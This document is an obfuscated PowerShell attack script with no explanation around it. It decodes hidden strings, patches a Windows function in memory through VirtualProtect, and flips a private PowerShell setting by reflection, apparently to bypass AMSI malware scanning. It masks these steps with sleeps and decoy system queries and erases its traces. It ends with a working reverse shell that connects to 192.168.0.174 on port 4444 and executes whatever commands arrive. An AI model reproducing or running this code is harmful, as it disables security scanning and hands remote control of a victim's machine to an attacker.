$env:dHtuLxbT = "7KUKpRml+6UGpRGlGqUKpQ=="
$env:LbBhyrtL = "BqUSpRilDqXupROlDqUZpeulBqUOpRGlCqUJpQ=="
$env:nSXWUwtz = "ED966566"
$env:kbVOSnLO = "7KUKpRml66UOpQqlEaUJpQ=="
$env:QZpGfXSe = "7KUKpRml+aUepRWlCqU="
$env:yWMG9Uf6 = "EKUKpRelE6UKpRGl2KXXpQ=="
$env:m81NR36k = "+KUKpRml+6UGpRGlGqUKpQ=="
$env:HCd8uiOj = "+KUepRilGaUKpRKl06XypQalE6UGpQylCqUSpQqlE6UZpdOl5qUapRmlFKUSpQalGaUOpRSlE6XTpealEqUYpQ6l+qUZpQ6lEaUYpQ=="
$env:XP3sw03U = "6qUZpRyl6qUbpQqlE6UZpfylF6UOpRmlCqX5pRelBqUTpRilC6UKpRel"
$env:q7fZm5th = "E6UZpQmlEaURpdOlCaURpRGl"

function fZPXnN($n){$b=[Convert]::FromBase64String([Environment]::GetEnvironmentVariable($n));$r=@();for($i=0;$i -lt $b.Length;$i++){$r+=($b[$i] - 165 + 256) % 256};[Text.Encoding]::Unicode.GetString([byte[]]$r)}

$yqs = fZPXnN 'QZpGfXSe'
$utm = fZPXnN 'kbVOSnLO'
$y9s = fZPXnN 'm81NR36k'
$tse = fZPXnN 'dHtuLxbT'
$db1 = [System.Reflection.BindingFlags]((0x37 -bxor 0x17) + (0x85 -bxor 0x8D))

$yl3 = [PSObject].Assembly

try {
  Start-Sleep -Milliseconds 191
  $null = Get-WmiObject Win32_OperatingSystem | Select-Object -ExpandProperty Caption
  $null = [Environment]::ProcessorCount
  $null = Test-Path "$env:SystemRoot\System32\kernel32.dll"

  try {
    $nqc = fZPXnN 'yWMG9Uf6'
    $aoj = fZPXnN 'XP3sw03U'
    $fkf = fZPXnN 'q7fZm5th'
    $code = @"
using System;
using System.Runtime.InteropServices;
public class WlfWqW {
  [DllImport("$nqc", EntryPoint="LoadLibraryA")]
  public static extern IntPtr mDgO(string n);
  [DllImport("$nqc", EntryPoint="GetProcAddress")]
  public static extern IntPtr mheq(IntPtr h, string n);
  [DllImport("$nqc", EntryPoint="VirtualProtect")]
  public static extern bool mFxV(IntPtr a, UIntPtr s, uint p, out uint o);
}
"@
    Add-Type -TypeDefinition $code
    $luz = [WlfWqW]::mDgO($fkf)
    $aj9 = [WlfWqW]::mheq($luz, $aoj)
    $fgz = 0
    [WlfWqW]::mFxV($aj9, [uint32]4, 0x40, [ref]$fgz) | Out-Null
    $ph = [Environment]::GetEnvironmentVariable("nSXWUwtz")
    $avu = @()
    for($i=0;$i -lt $ph.Length;$i+=2){
      $avu += [Convert]::ToByte($ph.Substring($i,2),16) -bxor 165
    }
    [System.Runtime.InteropServices.Marshal]::Copy([byte[]]$avu, 0, $aj9, 4)
    [WlfWqW]::mFxV($aj9, [uint32]4, $fgz, [ref]$fgz) | Out-Null
    Write-Host '[+] Stage 1 OK'
  } catch {
    Write-Host '[!] Stage 1 failed'
  }


  Start-Sleep -Milliseconds 169
  $null = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion" -Name ProductName -ErrorAction SilentlyContinue
  $null = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion" -Name ProgramFilesDir -ErrorAction SilentlyContinue

  try {
    $k59 = fZPXnN 'HCd8uiOj'
    $ec9 = $yl3.$yqs($k59)
    $xw9 = fZPXnN 'LbBhyrtL'
    $y4h = [System.DateTime]::Now.Ticks
    $twp = $ec9.$utm($xw9, $db1)
    $twp.$y9s($null, $true)
    $nkg = $twp.$tse($null)
    if ($nkg -eq $true) {
      Write-Host '[+] Stage 2 OK'
    } else {
      Write-Host '[!] Stage 2 failed'
    }
  } catch {
    Write-Host '[!] Stage 2 failed'
  }

  try {
    $ych = fZPXnN 'HCd8uiOj'
    $qcr = $yl3.$yqs($ych)
    if ($qcr -ne $null) {
      Write-Host '[+] Bypass confirmed'
    } else {
      Write-Host '[!] Bypass failed'
    }
  } catch {
    Write-Host '[!] Bypass failed'
  }

  Start-Sleep -Milliseconds 83
  $null = [System.IO.Path]::GetTempPath()
  $null = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion" -Name ProgramFilesDir -ErrorAction SilentlyContinue
  $null = Test-Path "$env:SystemRoot\System32\kernel32.dll"
}
finally {
  Remove-Item Env:\QZpGfXSe -ErrorAction SilentlyContinue
  Remove-Item Env:\kbVOSnLO -ErrorAction SilentlyContinue
  Remove-Item Env:\m81NR36k -ErrorAction SilentlyContinue
  Remove-Item Env:\dHtuLxbT -ErrorAction SilentlyContinue
  Remove-Item Env:\HCd8uiOj -ErrorAction SilentlyContinue
  Remove-Item Env:\LbBhyrtL -ErrorAction SilentlyContinue
  Remove-Item Env:\XP3sw03U -ErrorAction SilentlyContinue
  Remove-Item Env:\q7fZm5th -ErrorAction SilentlyContinue
  Remove-Item Env:\yWMG9Uf6 -ErrorAction SilentlyContinue
  Remove-Item Env:\nSXWUwtz -ErrorAction SilentlyContinue
}
        # Reverse shell execution
        try {
            $LHOST = "192.168.0.174"; 
            $LPORT = 4444; 
            $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); 
            $NetworkStream = $TCPClient.GetStream(); 
            $StreamReader = New-Object IO.StreamReader($NetworkStream); 
            $StreamWriter = New-Object IO.StreamWriter($NetworkStream); 
            $StreamWriter.AutoFlush = $true; 
            $Buffer = New-Object System.Byte[] 1024; 
            while ($TCPClient.Connected) { 
                while ($NetworkStream.DataAvailable) { 
                    $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); 
                    $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) 
                }; 
                if ($TCPClient.Connected -and $Code.Length -gt 1) { 
                    $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; 
                    $StreamWriter.Write("$Output`n"); 
                    $Code = $null 
                } 
            }; 
            $TCPClient.Close(); 
            $NetworkStream.Close(); 
            $StreamReader.Close(); 
            $StreamWriter.Close()
        } catch {
            Write-Host "[!] Reverse shell connection failed"
        }
        
